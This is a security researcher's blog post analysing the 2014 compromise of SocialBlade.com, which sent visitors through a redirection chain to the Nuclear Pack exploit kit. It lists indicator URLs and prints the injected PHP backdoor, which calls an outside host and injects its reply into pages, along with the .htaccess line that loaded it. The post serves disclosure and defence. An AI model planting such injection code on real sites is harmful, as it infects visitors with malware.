@@ -1,0 +1,108 @@
+SocialBlade.com compromised, starts redirection chain to Nuclear Pack exploit kit
+Update (07/29/2014): Following our notification, the developers in charge of SocialBlade.com have investigated and identified the source of the compromise. The site has been cleaned up of the malware and so far our systems have not detected anymore traces of suspicious activity. We will monitor the site for the next few days and update if required.
+Update 2 (07/29/2014): SocialBlade devs were kind enough to provide us with technical server details of the attack. We are sharing those in here as well in an effort to help the many other affected site owners in quickly identifying and addressing this type of compromise. Jump to server side section
+—
+Last week, we wrote about the compromise on AskMen.com that was leading unsuspecting visitors to the Nuclear Pack exploit kit and infecting computers that were vulnerable.
+In what appears to be a similar campaign, the YouTube stats tracker site SocialBlade.com is connected with malicious redirections that also lead to the Nuclear Pack EK.
+“Social Blade is a statistics driven website where you can track your Youtube progress and compare to other big youtubers to see how you are doing.”
+
+The drive-by download which was detected by our honeypots is successfully blocked by Malwarebytes Anti-Exploit.
+According to site tracker SimilarWeb, SocialBlade.com has a global rank of 5,791 and had around 3.6 million visits last month.
+
+Technical details
+Traffic flow:
+hxxp://socialblade.com/youtube/user/Goleyjoygame
+hxxp://socialblade.com/js/jquery.js
+hxxp://static.the-button.com/d2.php?ds=true&dr=1447532217
+hxxp://static.pointweb.ca/pop2.php?acc=sbc%0E%97%B0%FA%DD%92%05%CAF%F8%8E%8A%D1rd+%DD%BE%89%DD%AE&nrk=6160647100
+hxxp://e3dd7df0d05y.correctzoom.uni.me/
+hxxp://50d88d1ad05y.correctzoom.uni.me/1406197380.swf
+hxxp://50d88d1ad05y.correctzoom.uni.me/f/1406197380/7
+hxxp://50d88d1ad05y.correctzoom.uni.me/1406197380.pdf
+hxxp://50d88d1ad05y.correctzoom.uni.me/1406197380.htm
+hxxp://50d88d1ad05y.correctzoom.uni.me/f/1406197380/5/x00520804090407000700080150050f0304045106565601;1;5
+hxxp://50d88d1ad05y.correctzoom.uni.me/1406197380.jar
+Website compromise:
+Pinpointing exactly where the infection started was a little more complex than usual. Typically we’d see an iframe and we would be able to search for it by its string. This was not the case here, so we had to manually inspect each web session and external references.
+The intruder was in a core JavaScript file: hxxp://socialblade.com/js/jquery.js
+
+Very often, rogue code is appended to the end of existing plugins but isn’t always easy to spot or shouldn’t always be flagged as bad. What gave it away was looking for the original (unaltered) version of that jquery.js and compare both. It became obvious that additional code had been injected, probably by a backdoor residing on the web server itself.
+Update: Server side details
+Apache server logs:
+–2014-07-28 18:27:18–  http://sux.pw/p/?type=raw&id=9dc0840c
+Resolving sux.pw (sux.pw)…
+Cross-site contamination:
+The culprit: settings2.php
+<?php
+if (!isset($_SESSION)) session_start();
+if (!isset($_SESSION["pcid"]))
+{
+$imptt_agent = getenv('HTTP_USER_AGENT');
+if(stristr($imptt_agent, 'Windows NT')&&(stristr($imptt_agent, 'MSIE')||stristr($imptt_agent, 'Trident')))
+{
+$imptt_ip = ip2long($_SERVER['REMOTE_ADDR']);
+if($imptt_ip<0) $imptt_ip += 4294967296;
+$imptt_fp = fsockopen("static.the-button.com", 80);
+if ($imptt_fp)
+{
+fputs($imptt_fp,"GET /d2.php?dr=".rand(100000000,9999999999)."&di=".$imptt_ip."&du=".urlencode($imptt_agent)." HTTP/1.0\n\n");
+while(!feof($imptt_fp)) $imptt_pt=fgets($imptt_fp,4096);
+print (base64_decode($imptt_pt));
+fclose($imptt_fp);
+$_SESSION['pcid'] = $imptt_ip;
+}
+}
+}
+?>
+Infected .htaccess file:
+The cause: an .htaccess (which had 777 perms) was loading the content of settings2.php (malicious code) into each file when the site was rendered.
+php_value auto_append_file "/var/www/blog/wp-admin/network/settings2.php"
+Note: the actual directory path has been ‘anonymized’ as to not reveal SocialBlade’s infrastructure.
+JavaScript code analysis
+Now let’s get back to the JavaScript code server to visitors. The following variable (s) is made of unicode. This technique is often used to hide obvious strings from the human eye.
+We can translate it to characters to see what it hides:
+
+This gives us the URL (static.the-button.com/d2.php?) that is used as an iframe. This looks like a compromised site (too bad for the fans of the TV series Lost – go there at your own risk!).
+
+The rest of the JavaScript code writes the iframe and launches the redirection workflow. To see how it progresses we’re going to use Google Chrome’s JavaScript Console.
+Because the code only fires if the user is running Internet Explorer or Firefox, we can comment out the condition so it always executes, even in Chrome.
+
+The Network tab shows us what happens when that JavaScript is loaded. We can see the first request to d2.php, followed by pop2.php. It’s worth noting this redirection only happens once per IP address.
+
+Redirector #1:
+hxxp://static.the-button.com/d2.php?ds=true&dr=1447532217
+
+Source code:
+
+This creates an iframe to a second redirector.
+Redirector #2:
+hxxp://static.pointweb.ca/pop2.php?acc=sbc%0E%97%B0%FA%DD%92%05%CAF%F8%8E%8A%D1rd+%DD%BE%89%DD%AE&nrk=6160647100
+
+Now we have the final redirection to the exploit kit landing page (note the code obfuscation and the use of rot13 to mask the URL).
+Nuclear Pack EK landing page:
+hxxp://e3dd7df0d05y.correctzoom.uni.me/
+
+Flash exploit (CVE-2014-0515?):
+hxxp://50d88d1ad05y.correctzoom.uni.me/1406197380.swf
+VT (5/53) link
+
+PDF exploit (CVE-2010-0188 see this detailed blog post by Quequero):
+hxxp://50d88d1ad05y.correctzoom.uni.me/1406197380.pdf
+VT (4/52) link
+
+Java exploit (CVE-2013-2465?):
+hxxp://50d88d1ad05y.correctzoom.uni.me/1406197380.jar
+VT (4/52) link
+
+Internet Explorer exploit (CVE ?):
+hxxp://50d88d1ad05y.correctzoom.uni.me/1406197380.htm
+VT (0/53) link
+
+Payload:
+hxxp://50d88d1ad05y.correctzoom.uni.me/f/1406197380/7
+VT (17/52) link
+Malwarebytes Anti-Malware detects this as Trojan.Agent.ED.
+This downloader talks back to: icepower.su/b/shoe/75412 and then attempts to download a file from smokejuse.su/mod_articles9874.564/jquery/. This most likely leads to ad-fraud related malware (clickjacking etc.).
+We have notified the owners of SocialBlade.com so they can fix the issue ASAP and prevent unnecessary malware infections.
+As always, please make sure your computer is up-to-date (especially the browser and its plugins) and that you have real-time Antivirus/Anti-Malware protection. To be even one step ahead of the bad guys, feel free to consider Anti-Exploit mitigation tools that proactively detect and block malicious code behavior.
+@jeromesegura
